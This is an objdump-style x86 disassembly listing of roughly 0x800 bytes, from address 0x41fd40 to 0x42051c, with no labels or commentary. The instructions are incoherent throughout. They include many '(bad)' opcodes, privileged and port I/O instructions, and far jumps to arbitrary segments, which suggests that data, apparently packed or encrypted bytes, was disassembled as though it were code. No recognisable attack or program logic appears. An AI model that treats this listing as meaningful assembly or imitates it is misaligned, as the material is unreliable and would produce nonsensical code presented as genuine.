  41fd40:	and    cl,BYTE PTR [esi+esi*8-0x5d]
  41fd44:	sbb    al,0x29
  41fd46:	sbb    BYTE PTR [esi-0x3be74574],0xf6
  41fd4d:	mov    eax,0xb75914e1
  41fd52:	arpl   WORD PTR [esi+ecx*1+0x2f],bx
  41fd56:	mov    ah,0x2f
  41fd58:	inc    edx
  41fd59:	push   edx
  41fd5a:	pop    es
  41fd5b:	pop    ebp
  41fd5c:	pop    esp
  41fd5d:	dec    edx
  41fd5e:	cmp    DWORD PTR ds:[eax+eiz*8],ebx
  41fd62:	jl     0x41fd62
  41fd64:	adc    al,0x3f
  41fd66:	cmp    eax,0x80d69509
  41fd6b:	jge    0x41fdbd
  41fd6d:	dec    eax
  41fd6e:	test   al,0x7
  41fd70:	(bad)  ds:0xa1052f41
  41fd76:	outs   dx,BYTE PTR ds:[esi]
  41fd77:	xchg   DWORD PTR [eax+0x63fe6080],ebx
  41fd7d:	sbb    eax,0xe52d113c
  41fd82:	adc    DWORD PTR ds:0x9286de7,esi
  41fd88:	or     al,ch
  41fd8a:	nop
  41fd8b:	in     eax,0xda
  41fd8d:	pop    edi
  41fd8e:	shl    DWORD PTR [esi+ebp*2-0x4ea8700f],1
  41fd95:	and    ch,BYTE PTR [esi-0x50]
  41fd98:	xchg   ebx,eax
  41fd99:	arpl   WORD PTR [esi-0x15],bp
  41fd9c:	aam    0x7
  41fd9e:	xor    eax,0xcd947532
  41fda3:	dec    edx
  41fda4:	popf   
  41fda5:	add    edx,DWORD PTR [eax-0x41]
  41fda8:	test   al,0x5a
  41fdaa:	inc    sp
  41fdac:	pusha  
  41fdad:	ins    BYTE PTR es:[edi],dx
  41fdae:	inc    edi
  41fdaf:	inc    ecx
  41fdb0:	jmp    0x3b7b:0x44d0b7bb
  41fdb7:	iret   
  41fdb8:	cmp    bh,bl
  41fdba:	and    al,0xad
  41fdbc:	call   0xcb3e:0xfb3e3318
  41fdc3:	cs xchg ecx,eax
  41fdc5:	ror    DWORD PTR [edi-0x6e7e7e44],cl
  41fdcb:	imul   ecx,DWORD PTR [edi+0x3b],0x96e0f6f4
  41fdd2:	xchg   ebx,eax
  41fdd3:	xchg   ecx,eax
  41fdd4:	das    
  41fdd5:	jmp    0x6cb5:0x7a6ba3ef
  41fddc:	sub    bl,BYTE PTR [esi-0x6a]
  41fddf:	adc    DWORD PTR [eax],edx
  41fde1:	fwait
  41fde2:	xor    dl,bh
  41fde4:	call   0x16f23313
  41fde9:	mov    eax,ds:0xcd5c8d0e
  41fdee:	push   ebx
  41fdef:	inc    edx
  41fdf0:	adc    eax,0x9d2d2693
  41fdf5:	in     eax,0xdd
  41fdf7:	rol    DWORD PTR ds:0x670fdfe2,1
  41fdfd:	push   es
  41fdfe:	inc    ebp
  41fdff:	jae    0x41fe51
  41fe01:	jae    0x41fde5
  41fe03:	jae    0x41fe7b
  41fe05:	inc    edi
  41fe06:	ror    DWORD PTR [edx+0x54],1
  41fe09:	add    ecx,edi
  41fe0b:	leave  
  41fe0c:	inc    ebx
  41fe0d:	inc    edi
  41fe0e:	mov    ah,0xc3
  41fe10:	or     eax,0x7e5b31b1
  41fe15:	jbe    0x41fdf9
  41fe17:	in     eax,dx
  41fe18:	mov    ebx,0xd1d45c90
  41fe1d:	xor    DWORD PTR [ebx-0x1e],0x6d
  41fe21:	xchg   ecx,eax
  41fe22:	retf   
  41fe23:	sbb    eax,DWORD PTR [ebx+edx*1-0xb]
  41fe27:	inc    esp
  41fe28:	retf   0xafe5
  41fe2b:	test   al,0xc
  41fe2d:	and    DWORD PTR [ebp+0x2d],edx
  41fe30:	jbe    0x41fe9c
  41fe32:	(bad)  
  41fe33:	lea    esi,[esi*2+0x59975065]
  41fe3a:	fdivr  DWORD PTR [ebp-0x18152abe]
  41fe40:	xchg   dl,dl
  41fe42:	push   0x3
  41fe44:	mov    bh,0x1d
  41fe46:	mov    ch,0x8b
  41fe48:	or     al,0x60
  41fe4a:	call   0xfdf33be9
  41fe4f:	or     cl,BYTE PTR [ebx+0x63530a5b]
  41fe55:	push   eax
  41fe56:	jecxz  0x41fe78
  41fe58:	inc    edx
  41fe59:	test   DWORD PTR [ebx+0x6c454597],ebx
  41fe5f:	ror    bl,cl
  41fe61:	in     eax,dx
  41fe62:	mov    ds:0xc81ec546,eax
  41fe67:	jg     0x41fe0e
  41fe69:	shl    BYTE PTR [edi-0x46b54e53],cl
  41fe6f:	mov    ah,0xe
  41fe71:	mov    cl,0xb7
  41fe73:	mov    ds:0x96e2c819,eax
  41fe78:	add    DWORD PTR [ecx],edi
  41fe7a:	call   0xa4c19fe4
  41fe7f:	ja     0x41fe84
  41fe81:	scas   eax,DWORD PTR es:[edi]
  41fe82:	dec    esp
  41fe83:	sbb    ecx,DWORD PTR [edi]
  41fe85:	mov    ds:0x8b79aa61,al
  41fe8a:	nop
  41fe8b:	mov    ds:0x385e40b3,al
  41fe90:	frstor [ecx]
  41fe92:	inc    eax
  41fe93:	jmp    0x2ac6:0x40c37c71
  41fe9a:	adc    BYTE PTR [edx-0x28],dl
  41fe9d:	push   0x98936c67
  41fea2:	jg     0x41fe9e
  41fea4:	mov    cl,al
  41fea6:	mov    edx,0x19f6367b
  41feab:	scas   al,BYTE PTR es:[edi]
  41feac:	fwait
  41fead:	sbb    DWORD PTR [ebp-0x7b],edx
  41feb0:	sti    
  41feb1:	cdq    
  41feb2:	mov    bh,0xab
  41feb4:	and    eax,edx
  41feb6:	xchg   esi,eax
  41feb7:	xchg   ebx,eax
  41feb8:	xchg   esp,eax
  41feb9:	mov    dh,0x91
  41febb:	fcmovnb st,st(3)
  41febd:	sub    al,0x18
  41febf:	mov    edx,0x43bc8939
  41fec4:	adc    esi,DWORD PTR fs:[ebx-0x62]
  41fec8:	in     eax,dx
  41fec9:	or     BYTE PTR [eax],0xc5
  41fecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fecd:	setge  BYTE PTR [edi+0x6c]
  41fed1:	nop
  41fed2:	jmp    0x6307:0xa451de82
  41fed9:	ds sahf 
  41fedb:	push   es
  41fedc:	cmp    eax,0xf313194c
  41fee1:	mov    dh,0x1a
  41fee3:	inc    esp
  41fee4:	push   0x7a1c2bb6
  41fee9:	jns    0x41fed2
  41feeb:	xor    eax,0xf9712f6f
  41fef0:	lods   eax,DWORD PTR ds:[esi]
  41fef1:	test   al,0x4b
  41fef3:	dec    edx
  41fef4:	pop    ebp
  41fef5:	cmc    
  41fef6:	or     edx,DWORD PTR [edi+0x7229bb35]
  41fefc:	push   edi
  41fefd:	clc    
  41fefe:	push   ebx
  41feff:	dec    esi
  41ff00:	imul   ecx,DWORD PTR [esi+0x6e66848a],0xe8486f49
  41ff0a:	retf   0x438c
  41ff0d:	fist   WORD PTR [ebx+0x70]
  41ff10:	mov    WORD PTR [ebx-0x5ab32dc0],es
  41ff16:	xchg   edi,eax
  41ff17:	pop    ecx
  41ff18:	dec    edi
  41ff19:	add    DWORD PTR [edi-0x7a],edx
  41ff1c:	daa    
  41ff1d:	fcom   DWORD PTR [edi]
  41ff1f:	and    eax,0xadc63929
  41ff24:	gs or  eax,0xf0845bff
  41ff2a:	and    DWORD PTR [esp+eax*4],eax
  41ff2d:	dec    esi
  41ff2e:	jge    0x41ff09
  41ff30:	iret   
  41ff31:	and    BYTE PTR [esp+eax*2],0x10
  41ff35:	xchg   esi,eax
  41ff36:	pushw  0x5a97
  41ff3a:	sbb    cl,bl
  41ff3c:	add    BYTE PTR [edi-0x5a],cl
  41ff3f:	inc    ecx
  41ff40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff41:	into   
  41ff42:	test   eax,0xb99da97f
  41ff47:	adc    ebp,esi
  41ff49:	jno    0x41fecb
  41ff4b:	add    al,0x25
  41ff4d:	push   cs
  41ff4e:	popa   
  41ff4f:	jge    0x41fefa
  41ff51:	popf   
  41ff52:	retf   
  41ff53:	test   DWORD PTR [edx-0x27],esp
  41ff56:	sub    al,0xa1
  41ff58:	mov    bh,0xb4
  41ff5a:	cli    
  41ff5b:	sbb    al,0xab
  41ff5d:	xchg   DWORD PTR [si],edi
  41ff60:	lock sub eax,0xce50d0ff
  41ff66:	scas   eax,DWORD PTR es:[edi]
  41ff67:	lods   al,BYTE PTR ds:[esi]
  41ff68:	sub    al,0x9d
  41ff6a:	xchg   edx,eax
  41ff6b:	sub    esp,DWORD PTR [edx]
  41ff6d:	cld    
  41ff6e:	dec    edx
  41ff6f:	fidivr DWORD PTR [ecx+0xe143c61]
  41ff75:	cs jg  0x41ff0e
  41ff78:	or     esi,DWORD PTR [edi+0x7a94e805]
  41ff7e:	xor    al,0x58
  41ff80:	and    BYTE PTR [eax+0x2f],al
  41ff83:	jns    0x41ff70
  41ff85:	jne    0x41ffa6
  41ff87:	nop
  41ff88:	sub    eax,0xe33a4471
  41ff8d:	mov    ebp,0xa691917
  41ff92:	fild   WORD PTR [edi-0x4ba6b5f8]
  41ff98:	xchg   ebp,eax
  41ff99:	jae    0x41ff2f
  41ff9b:	ficomp DWORD PTR [ebx-0x80]
  41ff9e:	das    
  41ff9f:	mov    ebx,0x3f6d4704
  41ffa4:	push   ss
  41ffa5:	aas    
  41ffa6:	(bad)  
  41ffa7:	xor    BYTE PTR [eax],cl
  41ffa9:	cs in  eax,dx
  41ffab:	sub    al,0xda
  41ffad:	loope  0x42000d
  41ffaf:	(bad)  
  41ffb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffb1:	add    edi,0x30
  41ffb4:	xor    al,BYTE PTR [esi]
  41ffb6:	sbb    al,0x15
  41ffb8:	and    DWORD PTR [edx],0x5ce7023d
  41ffbe:	in     al,0xa
  41ffc0:	push   esp
  41ffc1:	jmp    0x2c4444e3
  41ffc6:	add    al,0xc9
  41ffc8:	into   
  41ffc9:	or     cl,BYTE PTR [edi+0x1ce09c46]
  41ffcf:	fdivr  QWORD PTR [eax+0x75]
  41ffd2:	sahf   
  41ffd3:	outs   dx,DWORD PTR ds:[esi]
  41ffd4:	cli    
  41ffd5:	mov    ecx,ebp
  41ffd7:	lahf   
  41ffd8:	mov    ch,0x5a
  41ffda:	icebp  
  41ffdb:	aam    0x83
  41ffdd:	adc    cl,BYTE PTR [edx+0x1e]
  41ffe0:	popa   
  41ffe1:	mov    ch,0xc
  41ffe3:	lock pslld mm6,QWORD PTR [edi]
  41ffe7:	xchg   BYTE PTR [edi],al
  41ffe9:	dec    eax
  41ffea:	mov    cl,0xd3
  41ffec:	jecxz  0x41ff82
  41ffee:	push   ebp
  41ffef:	aaa    
  41fff0:	repz jecxz 0x41ffc8
  41fff3:	sbb    DWORD PTR [ebx-0x9],ebp
  41fff6:	sub    DWORD PTR [ebx],0xffffffee
  41fff9:	fs jns 0x41ffc0
  41fffc:	sbb    esi,DWORD PTR [edi+0x330b156f]
  420002:	mov    ebp,0x2cafedd5
  420007:	je     0x41ffc9
  420009:	xor    al,0xbf
  42000b:	out    0x20,eax
  42000d:	in     al,dx
  42000e:	or     DWORD PTR [edi],esp
  420010:	in     eax,0xdb
  420012:	sbb    eax,0x95bccdc2
  420017:	loope  0x420084
  420019:	call   0xa9fb9963
  42001e:	pop    ebp
  42001f:	mov    ds:0x47353c3d,al
  420024:	pop    edx
  420025:	fsubr  QWORD PTR [edi-0x1947c02f]
  42002b:	scas   al,BYTE PTR es:[edi]
  42002c:	and    BYTE PTR [edi+0x2b1dc4c0],dl
  420032:	jo     0x41ffd9
  420034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420035:	nop
  420036:	test   BYTE PTR [edi-0x44953b],ch
  42003c:	pop    esi
  42003d:	ins    DWORD PTR es:[edi],dx
  42003e:	out    0x98,eax
  420040:	lea    eax,[eax-0x43]
  420043:	add    BYTE PTR [ecx+edi*2+0x2ba3169],0xb
  42004b:	aam    0x78
  42004d:	outs   dx,BYTE PTR ds:[esi]
  42004e:	les    esi,FWORD PTR [ebp-0x5e]
  420051:	sub    dl,ah
  420053:	xor    dl,0xdd
  420056:	cmp    esi,DWORD PTR [ecx+0x1a3d7a9f]
  42005c:	fld    QWORD PTR [edi+ebp*1+0x7c]
  420060:	xor    DWORD PTR [edi],esi
  420062:	add    ebx,DWORD PTR [ebx-0x26f8e471]
  420068:	dec    ebx
  420069:	mov    esi,0xa7dc591a
  42006e:	dec    eax
  42006f:	add    BYTE PTR [esp+eiz*4-0x7d4cf27b],dl
  420076:	mov    edi,0xea48ec56
  42007b:	mov    ah,0xfd
  42007d:	and    eax,0x49bff9ef
  420082:	in     eax,dx
  420083:	loope  0x4200a1
  420085:	push   esi
  420086:	jle    0x4200e2
  420088:	pop    edx
  420089:	neg    ebp
  42008b:	mov    ebp,0xce6c48c7
  420090:	cmp    dh,BYTE PTR [esi]
  420092:	sti    
  420093:	sbb    ebx,eax
  420095:	aam    0x1e
  420097:	sti    
  420098:	xor    BYTE PTR [edx-0x166a3d5],0x5c
  42009f:	mov    ebp,0xcffe26a0
  4200a4:	popa   
  4200a5:	arpl   cx,bp
  4200a7:	inc    BYTE PTR [edx]
  4200a9:	sub    eax,ebp
  4200ab:	cmp    eax,0x33a769c
  4200b0:	mov    ecx,0x21cd2b83
  4200b5:	mov    ebx,0x4b413a21
  4200ba:	xchg   esp,eax
  4200bb:	cld    
  4200bc:	pop    ss
  4200bd:	repz pop esp
  4200bf:	add    dl,cl
  4200c1:	mov    edx,0x69998ec4
  4200c6:	pop    ebp
  4200c7:	test   BYTE PTR [esi],bl
  4200c9:	(bad)  [ecx+eiz*1-0x382469ac]
  4200d0:	jg     0x42012d
  4200d2:	xchg   edi,eax
  4200d3:	mov    esp,0xe57014b1
  4200d8:	push   0xf7e87ba2
  4200dd:	xchg   DWORD PTR [edx+0x5f20daa0],edi
  4200e3:	add    DWORD PTR [ebx+0x7a168dd4],ebp
  4200e9:	mov    ds:0xee1b0625,al
  4200ee:	out    dx,al
  4200ef:	sbb    edx,DWORD PTR [ebx]
  4200f1:	add    esi,edx
  4200f3:	ins    BYTE PTR es:[edi],dx
  4200f4:	ficomp WORD PTR [ebx]
  4200f6:	in     al,dx
  4200f7:	mov    bl,bh
  4200f9:	(bad)  
  4200fa:	adc    ebx,DWORD PTR [ebx+0x5f30b877]
  420100:	out    dx,eax
  420101:	cs xchg edx,eax
  420103:	or     eax,0x1ff03540
  420108:	mov    bh,0xe
  42010a:	jmp    0x4200fd
  42010c:	in     al,dx
  42010d:	xchg   ecx,eax
  42010e:	xchg   ecx,eax
  42010f:	stos   BYTE PTR es:[edi],al
  420110:	pusha  
  420111:	fdiv   DWORD PTR [esi+esi*8-0x6e]
  420115:	mov    BYTE PTR gs:[esi-0x3c0bc1c6],bh
  42011c:	daa    
  42011d:	in     al,dx
  42011e:	push   0xffffffce
  420120:	fs (bad) 
  420122:	jmp    0x104c1cf9
  420127:	pushf  
  420128:	adc    DWORD PTR [ebp-0x26ad1c97],esi
  42012e:	cmp    dh,BYTE PTR [edi-0x37]
  420131:	cli    
  420132:	sub    ebx,DWORD PTR [edi]
  420134:	jmp    0xe088eba
  420139:	daa    
  42013a:	imul   esi,DWORD PTR [ecx+0xb],0x6a
  42013e:	add    eax,0x7dfe79ed
  420143:	jbe    0x4200e0
  420145:	fucomp st(3)
  420147:	retf   
  420148:	adc    edi,DWORD PTR [esi-0x4691669]
  42014e:	nop
  42014f:	and    eax,0x6b9ad8b1
  420154:	shl    edi,1
  420156:	jbe    0x4201cc
  420158:	ss jmp 0x4200fb
  42015b:	pop    esi
  42015c:	push   0xffffffbc
  42015e:	mov    WORD PTR [eax+edx*1+0x67],es
  420162:	(bad)  
  420163:	dec    ecx
  420164:	sbb    ecx,edi
  420166:	or     al,0x38
  420168:	jne    0x4200fa
  42016a:	xchg   edi,eax
  42016b:	test   BYTE PTR [esi+0x40f48d3f],ah
  420171:	pop    ebx
  420172:	not    BYTE PTR [eax-0x235b648]
  420178:	xchg   esp,eax
  420179:	or     BYTE PTR [edx],bl
  42017b:	and    ebx,DWORD PTR [ebx]
  42017d:	stos   BYTE PTR es:[edi],al
  42017e:	cmp    bh,cl
  420180:	sbb    DWORD PTR [eax-0x5b27c65a],ebp
  420186:	repnz xor cl,0xcb
  42018a:	or     eax,0xb27b69bd
  42018f:	(bad)  
  420190:	cmp    esi,DWORD PTR [ebx-0x2b7605ff]
  420196:	push   ss
  420197:	das    
  420198:	mov    ebx,DWORD PTR [esi-0x72c806a4]
  42019e:	test   al,0xa9
  4201a0:	dec    ebx
  4201a1:	or     BYTE PTR [eax-0x37],ch
  4201a4:	je     0x42014d
  4201a6:	adc    eax,0x2a1ac62b
  4201ab:	cli    
  4201ac:	ror    edx,1
  4201ae:	test   DWORD PTR [ecx+eiz*2+0x4],ebp
  4201b2:	aam    0x17
  4201b4:	aaa    
  4201b5:	fsub   DWORD PTR [ebp-0x6e]
  4201b8:	xor    esp,edx
  4201ba:	or     al,0x4a
  4201bc:	pop    ss
  4201bd:	jbe    0x42023d
  4201bf:	rcl    BYTE PTR [eax+0x14],cl
  4201c2:	popf   
  4201c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201c4:	stc    
  4201c5:	sahf   
  4201c6:	pop    edx
  4201c7:	xor    eax,DWORD PTR [ebx-0x75e2a519]
  4201cd:	clc    
  4201ce:	xor    bh,BYTE PTR [eax+0x54a19907]
  4201d4:	int    0x69
  4201d6:	xchg   DWORD PTR [esi-0x2d],eax
  4201d9:	aam    0xd0
  4201db:	out    0x3a,eax
  4201dd:	mov    ds:0x9e44de4f,al
  4201e2:	dec    esi
  4201e3:	sbb    esi,DWORD PTR [edx-0x59]
  4201e6:	adc    DWORD PTR ss:[edx+0x30aabc1b],ecx
  4201ed:	inc    eax
  4201ee:	xchg   esi,eax
  4201ef:	push   esp
  4201f0:	into   
  4201f1:	adc    eax,0x860e407
  4201f6:	mov    ebx,0x1b8936d3
  4201fb:	ins    DWORD PTR es:[edi],dx
  4201fc:	bound  esi,QWORD PTR [ebp-0x5780dfac]
  420202:	add    DWORD PTR [edi-0x10],ebx
  420205:	push   edx
  420206:	(bad)  
  420207:	out    dx,al
  420208:	gs daa 
  42020a:	pop    ss
  42020b:	and    BYTE PTR [ebx],dl
  42020d:	adc    DWORD PTR [edx+0x74],0xffffffe4
  420211:	mov    eax,ds:0xab0d9619
  420216:	mov    ecx,0xf9223b15
  42021b:	in     al,dx
  42021c:	pop    edx
  42021d:	and    esi,DWORD PTR [esi-0x3e]
  420220:	dec    ebx
  420221:	ja     0x42025a
  420223:	test   DWORD PTR [esi],ebp
  420225:	inc    ebx
  420226:	adc    DWORD PTR [ebx+ecx*8-0x1f4ec21b],edi
  42022d:	inc    eax
  42022e:	adc    BYTE PTR [ecx+0x5],al
  420231:	mov    al,ds:0x7b51cd58
  420236:	test   al,0xbf
  420238:	or     ah,BYTE PTR [esi+0x5df256fd]
  42023e:	xor    eax,0x18806b25
  420243:	xor    ecx,DWORD PTR [edx+0x28fa7afd]
  420249:	in     eax,0x42
  42024b:	mov    dh,0x2f
  42024d:	and    eax,0xe04e3674
  420252:	push   ds
  420253:	in     al,dx
  420254:	(bad)  
  420255:	cmp    dh,BYTE PTR ds:0xda36e4c8
  42025b:	popf   
  42025c:	add    DWORD PTR [ecx],esp
  42025e:	xlat   BYTE PTR ds:[ebx]
  42025f:	inc    esi
  420260:	iret   
  420261:	xchg   DWORD PTR [ecx+0x7f724988],esi
  420267:	jns    0x420227
  420269:	sbb    al,0x8a
  42026b:	inc    esi
  42026c:	xor    eax,0xe62e9d6f
  420271:	popf   
  420272:	xchg   DWORD PTR [ebp-0x2741411],ebx
  420278:	mov    esi,DWORD PTR [edx]
  42027a:	adc    dh,BYTE PTR [ebx+esi*8]
  42027d:	mov    dh,0x34
  42027f:	jle    0x420210
  420281:	sar    BYTE PTR [ebp+0x26d2c0d6],0xc
  420288:	out    dx,eax
  420289:	pop    ecx
  42028a:	pop    esp
  42028b:	mov    BYTE PTR [eax+0x23],al
  42028e:	jg     0x420282
  420290:	fidivr WORD PTR gs:[esi+esi*4+0x37]
  420295:	pusha  
  420296:	mov    bl,0x9f
  420298:	cdq    
  420299:	test   al,0x67
  42029b:	js     0x4202da
  42029d:	sbb    esi,edi
  42029f:	(bad)  
  4202a0:	repnz inc ebp
  4202a2:	sbb    esi,DWORD PTR [ebx]
  4202a4:	das    
  4202a5:	out    dx,eax
  4202a6:	mov    ds:0x1f3c4ee4,al
  4202ab:	adc    DWORD PTR [ecx+eiz*4],0xa36ffa77
  4202b2:	dec    eax
  4202b3:	(bad)  
  4202b4:	and    ah,ch
  4202b6:	push   0x41
  4202b8:	shl    DWORD PTR ds:0x1558f7b7,1
  4202be:	mov    BYTE PTR [ebx],al
  4202c0:	pushf  
  4202c1:	jns    0x4202b9
  4202c3:	test   al,0x92
  4202c5:	jge    0x420331
  4202c7:	ds push 0x6a
  4202ca:	add    eax,0x14d21e70
  4202cf:	and    DWORD PTR [ebp-0x6b47b252],esp
  4202d5:	pop    ss
  4202d6:	test   al,0x51
  4202d8:	inc    ebx
  4202d9:	gs push 0xffffff97
  4202dc:	mov    ecx,0xaa02efe6
  4202e1:	dec    DWORD PTR [ebp-0x56]
  4202e4:	repnz rcr DWORD PTR [eax+0x540f68e8],1
  4202eb:	das    
  4202ec:	aam    0x1c
  4202ee:	ret    
  4202ef:	dec    esp
  4202f0:	loope  0x420346
  4202f2:	mov    esi,0xad704487
  4202f7:	outs   dx,DWORD PTR ds:[esi]
  4202f8:	ins    DWORD PTR es:[edi],dx
  4202f9:	sbb    al,0xce
  4202fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202fc:	out    0xa2,eax
  4202fe:	inc    esp
  4202ff:	push   ss
  420300:	cmp    edx,DWORD PTR [edx-0x49]
  420303:	test   al,0x36
  420305:	idiv   BYTE PTR [ecx-0x69730db9]
  42030b:	sysexit 
  42030d:	jle    0x42032e
  42030f:	xlat   BYTE PTR ds:[ebx]
  420310:	pop    ss
  420311:	outs   dx,DWORD PTR ds:[esi]
  420312:	cmp    DWORD PTR [edi+0x504202e5],ebx
  420318:	outs   dx,DWORD PTR ds:[esi]
  420319:	xor    DWORD PTR [ebx],0x5fe33a83
  42031f:	enter  0xc8d3,0xe7
  420323:	dec    esp
  420324:	add    BYTE PTR [eax+0x15],dh
  420327:	(bad)  
  420328:	ins    DWORD PTR es:[edi],dx
  420329:	clc    
  42032a:	sbb    cl,bh
  42032c:	(bad)  
  42032d:	mov    esp,0x99cc47b9
  420332:	ret    0x46d3
  420335:	fwait
  420336:	cmp    eax,0xc3540383
  42033b:	inc    ebp
  42033c:	adc    al,0x44
  42033e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42033f:	out    dx,eax
  420340:	xlat   BYTE PTR ds:[ebx]
  420341:	in     al,dx
  420342:	call   0x5acc:0x7442df1b
  420349:	push   esp
  42034a:	fistp  WORD PTR [edi+esi*2-0x598b2a3c]
  420351:	into   
  420352:	popf   
  420353:	and    eax,0x795b5214
  420358:	xor    ebx,eax
  42035a:	loopne 0x42033b
  42035c:	and    DWORD PTR [ecx-0x34],esi
  42035f:	ss aad 0x8a
  420362:	add    BYTE PTR [esi],0xbc
  420365:	or     al,0x5a
  420367:	or     eax,0x15016a09
  42036c:	in     al,0x64
  42036e:	sahf   
  42036f:	mov    eax,0xe43a0ff
  420374:	add    DWORD PTR [ecx+0x3b],esp
  420377:	add    BYTE PTR [edi-0x4c0ba082],al
  42037d:	and    ecx,DWORD PTR [ecx+0x1e1b86f7]
  420383:	dec    eax
  420384:	out    0xcd,eax
  420386:	iret   
  420387:	je     0x42037e
  420389:	popa   
  42038a:	jmp    0xbcd71d96
  42038f:	fadd   DWORD PTR [edi+0x4c]
  420392:	adc    BYTE PTR [ebp-0x1ed64baa],0x12
  420399:	mov    ch,0x7a
  42039b:	pop    eax
  42039c:	hlt    
  42039d:	lods   al,BYTE PTR ds:[esi]
  42039e:	pusha  
  42039f:	out    0x68,eax
  4203a1:	inc    ebp
  4203a2:	outs   dx,DWORD PTR ds:[esi]
  4203a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203a4:	ret    
  4203a5:	fistp  WORD PTR [edi]
  4203a7:	aad    0xcd
  4203a9:	push   eax
  4203aa:	(bad)  
  4203ab:	pop    ds
  4203ac:	mov    ah,0x40
  4203ae:	shl    BYTE PTR [ebx+0x23879378],cl
  4203b4:	sbb    esi,DWORD PTR [esi+0x5e]
  4203b7:	pop    esp
  4203b8:	mov    esp,0x2fe07513
  4203bd:	dec    edx
  4203be:	inc    edi
  4203bf:	mov    esi,0x5807cdb3
  4203c4:	je     0x420376
  4203c6:	push   eax
  4203c7:	xchg   esi,eax
  4203c8:	cwde   
  4203c9:	leave  
  4203ca:	lea    ebx,[esi]
  4203cc:	mov    bl,0x5f
  4203ce:	cmp    bh,ah
  4203d0:	pusha  
  4203d1:	and    eax,0x684bbcd8
  4203d6:	pop    ecx
  4203d7:	mov    ch,0x15
  4203d9:	cmc    
  4203da:	xchg   esp,eax
  4203db:	outs   dx,BYTE PTR ds:[esi]
  4203dc:	push   cs
  4203dd:	test   DWORD PTR [ebx+edi*1-0x39fb3d81],ebx
  4203e4:	mov    ebp,0x6f7167ae
  4203e9:	icebp  
  4203ea:	xor    ecx,DWORD PTR [ebp-0x71e8f449]
  4203f0:	cmp    DWORD PTR [ebp-0x7140958b],edx
  4203f6:	fild   DWORD PTR [eax-0xeacca]
  4203fc:	cdq    
  4203fd:	adc    eax,0xfbde294e
  420402:	jae    0x42040e
  420404:	je     0x42046a
  420406:	inc    edx
  420407:	add    dl,BYTE PTR [ebp+0x79]
  42040a:	fldenv [ebp-0x5b6ef34]
  420410:	xchg   esi,eax
  420411:	rol    BYTE PTR [ebp+0x78fc3988],0x43
  420418:	cmp    ebx,DWORD PTR [esi-0x1505a641]
  42041e:	xchg   ebx,eax
  42041f:	fadd   QWORD PTR [edx+0x1562c07d]
  420425:	xlat   BYTE PTR ds:[ebx]
  420426:	call   0x796d:0x80ea195e
  42042d:	mov    ?,ecx
  42042f:	mov    gs,WORD PTR [edx-0x7f4ee0ba]
  420435:	jo     0x420496
  420437:	nop
  420438:	(bad)  
  420439:	add    dh,BYTE PTR [bx+0x65]
  42043d:	add    BYTE PTR [edi+0x3dfcb384],0x46
  420444:	shr    BYTE PTR [edx],1
  420446:	and    al,0x7e
  420448:	nop
  420449:	add    al,0x41
  42044b:	in     eax,0xaf
  42044d:	dec    ebp
  42044e:	xor    ebp,edx
  420450:	das    
  420451:	in     eax,dx
  420452:	mov    al,ds:0x8fee5cca
  420457:	push   es
  420458:	push   ds
  420459:	sbb    al,0x49
  42045b:	outs   dx,DWORD PTR ds:[esi]
  42045c:	aas    
  42045d:	sbb    DWORD PTR [eax+0x7d],ebp
  420460:	xchg   edx,eax
  420461:	or     al,0x24
  420463:	bound  ebp,QWORD PTR [ebp+0x4e]
  420466:	sub    al,0xbc
  420468:	rcl    BYTE PTR [edx+0x4d89c2e],cl
  42046e:	jg     0x4204b9
  420470:	add    al,BYTE PTR [eax-0x400c1a5a]
  420476:	mov    ds:0x826680b3,eax
  42047b:	aas    
  42047c:	fdivr  QWORD PTR [esi-0xdd5d62f]
  420482:	cmp    bh,BYTE PTR [ebp-0x4126bd79]
  420488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420489:	push   ds
  42048a:	pop    edx
  42048b:	cmp    BYTE PTR [edi],cl
  42048d:	loopne 0x4204d7
  42048f:	imul   esp,DWORD PTR [edx+0x1d5b8d4c],0x7d
  420496:	xchg   BYTE PTR [ebp+0x4c],bh
  420499:	ins    DWORD PTR es:[edi],dx
  42049a:	cmp    eax,0xf9846475
  42049f:	shl    DWORD PTR [ebx+0x7],cl
  4204a2:	jmp    0x4a43:0x462ef7ed
  4204a9:	stos   DWORD PTR es:[edi],eax
  4204aa:	imul   DWORD PTR [edx+0x7f]
  4204ad:	aas    
  4204ae:	into   
  4204af:	push   0x5a
  4204b1:	mov    al,ds:0xac92eee
  4204b6:	in     eax,0xe9
  4204b8:	out    dx,eax
  4204b9:	mov    ah,0xce
  4204bb:	xchg   edx,eax
  4204bc:	mov    eax,ds:0x4576c289
  4204c1:	popa   
  4204c2:	cmp    al,bl
  4204c4:	inc    edx
  4204c5:	xlat   BYTE PTR ds:[ebx]
  4204c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204c7:	das    
  4204c8:	and    eax,0x8e1b0961
  4204cd:	clc    
  4204ce:	iret   
  4204cf:	shr    DWORD PTR [eax],1
  4204d1:	popa   
  4204d2:	bnd jb 0x420456
  4204d5:	add    dl,bh
  4204d7:	outs   dx,DWORD PTR ds:[esi]
  4204d8:	xlat   BYTE PTR ds:[ebx]
  4204d9:	arpl   si,bx
  4204db:	iret   
  4204dc:	outs   dx,BYTE PTR ds:[esi]
  4204dd:	xor    ch,BYTE PTR [edi+0x28]
  4204e0:	test   eax,0xd9982c53
  4204e5:	imul   ecx,DWORD PTR [ebx+edi*8-0x7640a77a],0x2c
  4204ed:	sub    BYTE PTR [ebx],0x1f
  4204f0:	adc    bl,BYTE PTR [esi+0x50101e59]
  4204f6:	imul   edx,DWORD PTR [eax+0x48],0x19
  4204fa:	and    eax,0xf95a4717
  4204ff:	(bad)  
  420500:	cld    
  420501:	add    ch,BYTE PTR [ecx-0x7]
  420504:	sbb    edx,DWORD PTR [ecx]
  420506:	add    al,0x50
  420508:	loopne 0x420576
  42050a:	aas    
  42050b:	pop    ds
  42050c:	sub    al,0x4
  42050e:	es jns 0x420501
  420511:	adc    BYTE PTR [ebx-0x1600582b],dl
  420517:	mov    esi,0x61afd7e0
  42051c:	push   es
